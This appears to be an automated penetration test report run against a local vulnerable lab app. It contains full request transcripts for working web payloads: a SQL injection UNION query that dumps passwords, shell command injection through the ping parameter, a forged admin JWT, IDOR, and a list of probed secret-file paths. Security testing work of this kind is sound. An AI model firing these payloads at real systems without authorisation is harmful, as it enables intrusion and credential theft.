# Penetration Test Report - 20261109-161158-127.0.0.1

- **Target:** `127.0.0.1` (20261109-161158-127.0.0.1)
- **Date:** 2026-11-09 16:11:58
- **Duration:** 3.3s
- **Agent model:** scripted-demo
- **Requests sent:** 65

## Executive summary

Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a forged JWT accepted against a rejected control. Candidate: reflected XSS - unescaped, but no browser executed it. Host-header reflection left as a lead.

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 1 |
| Medium | 2 |

| Proof grade | Count | Meaning |
|---|---|---|
| **proven** | 5 | the class-specific artifact and its control are on record |
| **candidate** | 1 | a real signal; a named check is still missing |

| OWASP Top 10 (2021) | Findings |
|---|---|
| A01 Broken Access Control | F04, F05 |
| A02 Cryptographic Failures | F06 |
| A03 Injection | F01, F02, F03 |

## Engagement constraints

- **Scope hosts:** (target only)
- **Excluded paths:** none
- **Budgets:** 16 turns, 400 requests, 0 rps
- **Proxy:** no · **TLS verify:** no
- **Tool surface:** all


## Findings

### F01 - SQL injection in /item id parameter

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** sqli · **proof: proven**
- **CWE:** `CWE-89`
- **OWASP:** A03 Injection
- **Endpoint:** `http://127.0.0.1:34943/item?id=1`
- **Evidence:** r2, r15

**Description**  
id is interpolated into the query string. The quote probe returns a raw sqlite error; a UNION SELECT limited to five rows returns credentials from the users table.

**Proof (verbatim excerpt)**  
```
admin - $s3cr3t-admin-pw
```

**Remediation**  
Use parameterized queries.

**Proof grade: proven**  

_Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r15
- [x] data store fingerprinted - sqlite3.OperationalError
- [x] the query named its target - users in r15
- [x] rows returned, not an error message - quoted from r15
- [x] extraction stayed minimal

<details><summary>Transcript r2: GET http://127.0.0.1:34943/item?id=1%27 -> 500</summary>

```http
GET http://127.0.0.1:34943/item?id=1%27
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/500
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:58 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 102

<html><body>sqlite3.OperationalError: unrecognized token: "'1''" near "1'": syntax error</body></html>
```
</details>

<details><summary>Transcript r15: GET http://127.0.0.1:34943/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+- -> 200</summary>

```http
GET http://127.0.0.1:34943/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+-
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:58 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 139

<html><body><ul><li>admin - $s3cr3t-admin-pw</li><li>alice - $alice-pw</li><li>bob - $bob-pw</li><li>widget - $9.99</li></ul></body></html>
```
</details>

### F02 - OS command injection in /ping host parameter

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** rce · **proof: proven**
- **CWE:** `CWE-78`
- **OWASP:** A03 Injection
- **Endpoint:** `http://127.0.0.1:34943/ping?host=127.0.0.1`
- **Evidence:** r18

**Description**  
host is concatenated into a shell command. `id; echo <nonce>` returns the server's own identity line and the nonce, so the output is computed by the target and not reflected.

**Proof (verbatim excerpt)**  
```
uid=1000(kali)
```

**Remediation**  
Never pass request data to a shell; exec with an argv list and validate the host as an address.

**Proof grade: proven**  

_Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r18
- [x] a benign command was sent - exchange r18
- [x] identity output returned by the target - 'uid=1000(kali)' in r18
- [x] the probe nonce came back in the output - 'argusklc7nv1v' in r18
- [x] proof command stayed benign

<details><summary>Transcript r18: GET http://127.0.0.1:34943/ping?host=127.0.0.1%3B+id%3B+echo+argusklc7nv1v -> 200</summary>

```http
GET http://127.0.0.1:34943/ping?host=127.0.0.1%3B+id%3B+echo+argusklc7nv1v
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:59 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 337

<html><body><pre>PING 127.0.0.1: 4 packets, 0% loss
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),104(kvm),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer),143(docker),1004(devTeam)

argusklc7nv1v</pre></body></html>
```
</details>

### F06 - JWT weak secret: forged admin token accepted

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** jwt · **proof: proven**
- **CWE:** `CWE-347`
- **OWASP:** A02 Cryptographic Failures
- **Endpoint:** `http://127.0.0.1:34943/api/me`
- **Evidence:** r64, r63, r62

**Description**  
The session JWT verifies against the dictionary secret 'secret123'. A token forged offline with role=admin is accepted and its claims echoed back; the same request with a broken signature is refused with 401, so the endpoint does verify - against a guessable key.

**Proof (verbatim excerpt)**  
```
"role": "admin"
```

**Remediation**  
Rotate to a high-entropy secret; prefer asymmetric signing.

**Proof grade: proven**  

_Requirement for jwt:_ a credential this system minted, accepted on a privileged resource with its claims echoed back, and another credential refused on the same endpoint

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r63
- [x] this system minted the credential - jwt_forge r62 set ['role', 'user'], echoed 'admin'
- [x] a forged credential was accepted - 127.0.0.1/api/me returned 200 with a credential
- [x] the same endpoint refuses another credential - 127.0.0.1/api/me answered 401 to a credentialed request

<details><summary>Transcript r64: GET http://127.0.0.1:34943/api/me -> 401</summary>

```http
GET http://127.0.0.1:34943/api/me
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)
authorization: Bearer •••redacted•••

HTTP/401
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:12:01 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 22

{"error": "bad token"}
```
</details>

<details><summary>Transcript r63: GET http://127.0.0.1:34943/api/me -> 200</summary>

```http
GET http://127.0.0.1:34943/api/me
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)
authorization: Bearer •••redacted•••

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:12:01 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 93

{"ok": true, "claims": {"sub": "alice", "role": "admin", "iat": 1794258718, "user": "admin"}}
```
</details>

### F04 - IDOR: /api/user/<id> serves any user object

- **Severity:** High
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Category:** idor · **proof: proven**
- **CWE:** `CWE-639`
- **OWASP:** A01 Broken Access Control
- **Endpoint:** `http://127.0.0.1:34943/api/user/2`
- **Evidence:** r20, r22

**Description**  
Object ids are not checked against the caller. Reading id 2 returns alice; reading id 1 returns the admin record, with no credential distinguishing the two requests.

**Proof (verbatim excerpt)**  
```
"username": "admin"
```

**Remediation**  
Enforce per-object ownership checks.

**Proof grade: proven**  

_Requirement for idor:_ one actor reaching another's subject on the same endpoint, with subject-identifying data and nothing entitling the caller to it

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r22
- [x] two distinct object references on one endpoint - ['2'] vs ['1'] on 127.0.0.1/api/user/{id}
- [x] another subject's data returned - present in r22, absent from r20
- [x] the data identifies a subject
- [x] the caller was not entitled to it - no credential was presented and subject data came back

<details><summary>Transcript r20: GET http://127.0.0.1:34943/api/user/2 -> 200</summary>

```http
GET http://127.0.0.1:34943/api/user/2
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:59 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 74

{"id": 2, "username": "alice", "role": "user", "email": "alice@lab.local"}
```
</details>

<details><summary>Transcript r22: GET http://127.0.0.1:34943/api/user/1 -> 200</summary>

```http
GET http://127.0.0.1:34943/api/user/1
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:59 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 75

{"id": 1, "username": "admin", "role": "admin", "email": "admin@lab.local"}
```
</details>

### F05 - Exposed /.env and /.git/HEAD at web root

- **Severity:** Medium
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Category:** info-disclosure · **proof: proven**
- **CWE:** `CWE-200`
- **OWASP:** A01 Broken Access Control
- **Endpoint:** `http://127.0.0.1:34943/.env`
- **Evidence:** r27

**Description**  
Sensitive paths are served publicly - credentials and source-control metadata leak to anyone.

**Proof (verbatim excerpt)**  
```
SECRET_KEY=lab-secret-0123
```

**Remediation**  
Deny dotfile/VCS paths at the web server; rotate exposed secrets.

**Proof grade: proven**  

_Requirement for disclosure:_ the credential or source observed in a response, quoted as the bytes that leaked

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r27
- [x] a credential-shaped secret was observed - SECRET_KEY=lab-secret-01...
- [x] it came from a response, not from the request - in r27

<details><summary>Transcript r27: GET http://127.0.0.1:34943/.env -> 200</summary>

```http
GET http://127.0.0.1:34943/.env
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:59 GMT
content-type: text/plain
x-powered-by: LabVuln/1.0
content-length: 67

DB_HOST=db.internal
DB_PASSWORD=hunter2
SECRET_KEY=lab-secret-0123

```
</details>

### F03 - Reflected XSS in /search q parameter

- **Severity:** Medium
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- **Category:** xss · **proof: candidate**
- **CWE:** `CWE-79`
- **OWASP:** A03 Injection
- **Endpoint:** `http://127.0.0.1:34943/search?q=x`
- **Evidence:** r19

**Description**  
Canary chars < > " ' reflect unescaped in an html context. Execution is not shown here - this engagement had no browser, so the class stays a candidate.

**Proof (verbatim excerpt)**  
```
<>'"&=/
```

**Remediation**  
Output-encode by context; add CSP.

**Proof grade: candidate**  

_Requirement for xss:_ a headless browser executing the payload and reporting the probe nonce

- [x] proof read from the wire
- [x] the target produced the quoted bytes
- [x] payload reflected unencoded into HTML - '<>"\'' survived into r19
- [ ] a real browser executed it - this system has no browser, so execution is not provable here. Drive one over mcp_call and cite the nonce it reports, or leave this a candidate and say so in the report

<details><summary>Transcript r19: GET http://127.0.0.1:34943/search?q=xj2hxqunw%3C%3E%27%22%26%3D%2F -> 200</summary>

```http
GET http://127.0.0.1:34943/search?q=xj2hxqunw%3C%3E%27%22%26%3D%2F
host: 127.0.0.1:34943
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.14.6
date: Mon, 09 Nov 2026 21:11:59 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 55

<html><body>Results for: xj2hxqunw<>'"&=/</body></html>
```
</details>


## Test coverage

| Tool | Requests |
|---|---|
| http_request | 2 |
| jwt_forge | 1 |
| probe_cmdi | 3 |
| probe_disclosure | 38 |
| probe_idor | 4 |
| probe_reflection | 1 |
| probe_sqli | 15 |
| probe_xfh | 1 |

**Probe families run:** probe_cmdi, probe_disclosure, probe_idor, probe_reflection, probe_sqli, probe_xfh

**Endpoints exercised (47):**

- `GET /.DS_Store`
- `GET /.aws/credentials`
- `GET /.env`
- `GET /.git/HEAD`
- `GET /.git/config`
- `GET /.gitignore`
- `GET /.npmrc`
- `GET /.svn/entries`
- `GET /WEB-INF/web.xml`
- `GET /actuator/env`
- `GET /actuator/heapdump`
- `GET /actuator/info`
- `GET /actuator/mappings`
- `GET /adminer.php`
- `GET /api-docs`
- `GET /api/me`
- `GET /api/user/0`
- `GET /api/user/1`
- `GET /api/user/2`
- `GET /api/user/3`
- `GET /arg404sd4vbwzb`
- `GET /backup.zip`
- `GET /composer.json`
- `GET /console`
- `GET /debug`
- `GET /debug/pprof/`
- `GET /debug/vars`
- `GET /docker-compose.yml`
- `GET /elmah.axd`
- `GET /health`
- `GET /item?id`
- `GET /manager/html`
- `GET /metrics`
- `GET /nginx_status`
- `GET /package.json`
- `GET /phpinfo.php`
- `GET /phpmyadmin/`
- `GET /ping?host`
- `GET /reset`
- `GET /search?q`
- `GET /server-info`
- `GET /server-status`
- `GET /swagger.json`
- `GET /trace`
- `GET /v2/api-docs`
- `GET /web.config`
- `GET /wp-config.php~`

## Methodology

Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
mapping -> hypothesis-driven probes (matched true/false pairs,
baseline-diffed) -> verification -> evidence-gated findings.
The complete request/response transcript is in `transcript.jsonl`
(65 entries). Working notes are in `notes.md`.

Every finding is graded against the proof requirement for its class
(`argus proof <class>`): **proven** means the class-specific artifact
and its control are both on record; **candidate** means a real signal
with a named check still missing. A candidate is reported because it
is worth re-testing, not because it is a result.

_All findings cite verbatim response excerpts verified against the
recorded transcript at write time._

<details><summary>Appendix: agent working notes (audit)</summary>

```
# Working notes - http://127.0.0.1:34943

## Agent summary (agent)

Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a forged JWT accepted against a rejected control. Candidate: reflected XSS - unescaped, but no browser executed it. Host-header reflection left as a lead.


```
</details>